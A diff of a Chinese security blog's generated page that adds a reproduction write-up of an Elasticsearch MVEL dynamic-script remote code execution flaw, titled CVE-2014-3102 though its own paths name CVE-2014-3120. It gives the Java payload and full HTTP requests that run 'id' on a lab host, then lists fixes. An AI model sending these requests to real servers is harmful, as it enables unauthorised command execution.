@@ -75,6 +75,59 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-CVE-2014-3102-ElasticSearch命令执行漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/12/20/CVE-2014-3102-ElasticSearch%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time class="dt-published" datetime="2020-12-20T10:14:15.000Z" itemprop="datePublished">2020-12-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/12/20/CVE-2014-3102-ElasticSearch%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">CVE-2014-3102 ElasticSearch命令执行漏洞</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h2><p>Elasticsearch 是一个基于 Lucene 库的搜索引擎，具有 HTTP Web 接口和无模式 JSON 文档。Elasticsearch 是用 Java 开发的，其支持 MVEL、js、Java 等语言，其老版本默认语言为 MVEL。</p>
+<p>MVEL -一个被众多 Java 项目使用的开源的表达式语言。</p>
+<p>Elasticsearch 1.2之前的版本默认配置启用了动态脚本，该脚本允许远程攻击者通过 _search 的 source 参数执行任意 MVEL 表达式和 Java 代码。</p>
+<h2 id="二、影响版本"><a href="#二、影响版本" class="headerlink" title="二、影响版本"></a>二、影响版本</h2><p>Elasticsearch &lt; 1.2</p>
+<h2 id="三、漏洞原理"><a href="#三、漏洞原理" class="headerlink" title="三、漏洞原理"></a>三、漏洞原理</h2><p>老版本ElasticSearch支持传入动态脚本（MVEL）来执行一些复杂的操作，而MVEL可执行Java代码，而且没有沙盒，所以我们可以直接执行任意代码。</p>
+<p>MVEL执行命令的代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">new java.util.Scanner(Runtime.getRuntime().exec(&quot;id&quot;).getInputStream()).useDelimiter(&quot;\\A&quot;).next();</span><br></pre></td></tr></table></figure>
+<h2 id="四、利用过程"><a href="#四、利用过程" class="headerlink" title="四、利用过程"></a>四、利用过程</h2><p>拉取镜像，访问地址<br>![](G:\PenetrationTest\漏洞复现笔记\中间件漏洞\CVE-2014-3120 ElasticSearch命令执行漏洞\img/1.png)<br>看到版本是1.1.1</p>
+<p>抓包，向Elasticsearch添加一条数据，该漏洞需要es中至少存在一条数据，所以我们需要先创建一条数据<br>![](G:\PenetrationTest\漏洞复现笔记\中间件漏洞\CVE-2014-3120 ElasticSearch命令执行漏洞\img/2.png)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;website&#x2F;blog&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 8.131.79.166:23740</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko&#x2F;20100101 Firefox&#x2F;82.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cookie: vue_admin_template_token&#x3D;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjA0ODMyNjU5LCJlbWFpbCI6ImFkbWluQGZvZmEuc28ifQ.Ysdnqw9GZhCMD37LNHJ82USLPHEQSQjeaam2EoZatPs</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 30</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;vulfocus&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>script 为最终执行 Java 代码的地方，此字段会被默认当作脚本执行，按照其 json 格式向其填充要执行的代码即可，执行任意代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;_search?pretty HTTP&#x2F;1.1</span><br><span class="line">Host: 8.131.79.166:23740</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko&#x2F;20100101 Firefox&#x2F;82.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cookie: vue_admin_template_token&#x3D;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjA0ODMyNjU5LCJlbWFpbCI6ImFkbWluQGZvZmEuc28ifQ.Ysdnqw9GZhCMD37LNHJ82USLPHEQSQjeaam2EoZatPs</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 360</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;size&quot;: 1,</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">      &quot;filtered&quot;: &#123;</span><br><span class="line">        &quot;query&quot;: &#123;</span><br><span class="line">          &quot;match_all&quot;: &#123;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;script_fields&quot;: &#123;</span><br><span class="line">        &quot;command&quot;: &#123;</span><br><span class="line">            &quot;script&quot;: &quot;import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\&quot;id\&quot;).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next();&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>![](G:\PenetrationTest\漏洞复现笔记\中间件漏洞\CVE-2014-3120 ElasticSearch命令执行漏洞\img/3.png)</p>
+<h2 id="五、修复方案"><a href="#五、修复方案" class="headerlink" title="五、修复方案"></a>五、修复方案</h2><p>1、升级到新版本，大于等于1.2版本即可解决此问题</p>
+<p>2、设置 script.disable_dynamic = true，官方已在1.2版本中将 true 设置为默认值</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://givemefivw.github.io/2020/12/20/CVE-2014-3102-ElasticSearch%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckiy6chzm00027ca016uw101y" data-title="CVE-2014-3102 ElasticSearch命令执行漏洞" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-CVE-2012-0392-Struts2-008命令执行漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/12/20/CVE-2012-0392-Struts2-008%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
@@ -106,7 +159,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://givemefivw.github.io/2020/12/20/CVE-2012-0392-Struts2-008%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckiy4o54800024ga05l6l16cs" data-title="CVE-2012-0392 Struts2-008命令执行漏洞" class="article-share-link">Share</a>
+      <a data-url="https://givemefivw.github.io/2020/12/20/CVE-2012-0392-Struts2-008%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckiy6chzj00017ca08f2iaygq" data-title="CVE-2012-0392 Struts2-008命令执行漏洞" class="article-share-link">Share</a>
       
       
       
@@ -148,7 +201,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://givemefivw.github.io/2020/12/20/CNVD-2019-48814-Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="ckiy4o53o00004ga020g8f3wa" data-title="CNVD-2019-48814 Weblogic反序列化漏洞" class="article-share-link">Share</a>
+      <a data-url="https://givemefivw.github.io/2020/12/20/CNVD-2019-48814-Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="ckiy6chz600007ca07mgs5mhg" data-title="CNVD-2019-48814 Weblogic反序列化漏洞" class="article-share-link">Share</a>
       
       
       
@@ -190,7 +243,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://givemefivw.github.io/2020/12/20/CVE-2018-24942-ThinkPHP5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckiy4o54s000d4ga08om282id" data-title="CVE-2018-24942 ThinkPHP5远程代码执行漏洞" class="article-share-link">Share</a>
+      <a data-url="https://givemefivw.github.io/2020/12/20/CVE-2018-24942-ThinkPHP5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckiy6ci0e000b7ca00bgebxbq" data-title="CVE-2018-24942 ThinkPHP5远程代码执行漏洞" class="article-share-link">Share</a>
       
       
       
@@ -230,7 +283,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/POC/" style="font-size: 10px;">POC</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a>
+      <a href="/tags/POC/" style="font-size: 10px;">POC</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 20px;">复现</a>
     </div>
   </div>
 
@@ -252,6 +305,10 @@
       <ul>
         
           <li>
+            <a href="/2020/12/21/CVE-2020-11651-SaltStack%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87/">CVE-2020-11651 SaltStack认证绕过</a>
+          </li>
+        
+          <li>
             <a href="/2020/12/21/CVE-2017-11610-Supervisord%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">CVE-2017-11610 Supervisord远程命令执行漏洞</a>
           </li>
         
@@ -265,10 +322,6 @@
         
           <li>
             <a href="/2020/12/20/CVE-2020-26258andCVE-2020-26259-Xstream-SSRFand%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4POC/">CVE-2020-26258andCVE-2020-26259 Xstream SSRFand任意文件删除POC</a>
-          </li>
-        
-          <li>
-            <a href="/2020/12/20/CVE-2017-9791-Struts2-S2-048%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">CVE-2017-9791 Struts2 S2-048远程代码执行漏洞</a>
           </li>
         
       </ul>
